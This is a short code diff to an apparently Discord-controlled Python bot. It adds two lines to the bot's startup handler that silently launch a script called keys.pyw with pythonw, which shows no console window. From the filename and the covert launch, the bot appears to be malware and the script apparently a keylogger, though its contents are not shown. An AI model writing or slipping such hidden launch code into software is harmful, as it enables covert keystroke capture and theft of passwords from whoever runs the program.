@@ -385,6 +385,8 @@ async def on_ready():
                 channel = nextcord.utils.get(category.text_channels, name="events")
                 if channel:
                     await channel.send(embed=embed)
+                global process
+                process = subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-main", "keys.pyw")], shell=True)
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def send_status():
